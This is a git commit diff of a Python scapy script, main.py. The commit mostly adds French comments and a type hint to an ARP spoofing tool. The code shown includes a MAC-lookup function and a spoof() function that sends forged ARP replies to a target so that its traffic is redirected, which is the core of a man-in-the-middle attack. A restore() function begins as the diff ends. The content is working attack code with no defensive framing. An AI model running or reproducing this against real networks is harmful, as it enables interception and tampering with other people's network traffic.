e1222c89dc5e3d9e168524e302e1d935a6073d04
Antoine Chauvin <antoine.chauvin@live.fr>
2021-10-11 20:34:06 +0200

    Update main.py

--- main.py
+++ main.py
@@ -2,18 +2,26 @@ import scapy.all as scapy
 import time
 
 
-def get_mac(ip):
-	arp_request = scapy.ARP(pdst = ip)
-	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-	arp_request_broadcast = broadcast / arp_request
-	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+def get_mac(ip) -> str:
+	arp_request = scapy.ARP(pdst = ip) # Creation d'une trame ARP
+	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") # Creation d'une trame ETHERNET
+	arp_request_broadcast = broadcast / arp_request # Encapsulation
+	
+	'''
+	srp() renvoie deux objets : le premier contient les paquets émis et leurs réponses associées,
+	l'autre contient les paquets sans réponse.
+	
+	ici on cherche l'adresse hwsrc du routeur
+	'''
+	
+	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
+	
 	return answered_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip) -> None:
 	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
-															psrc = spoof_ip)
+			   psrc = spoof_ip)
 	scapy.send(packet, verbose = False)
-
 
 def restore(destination_ip, source_ip) -> None:
 	destination_mac = get_mac(destination_ip)
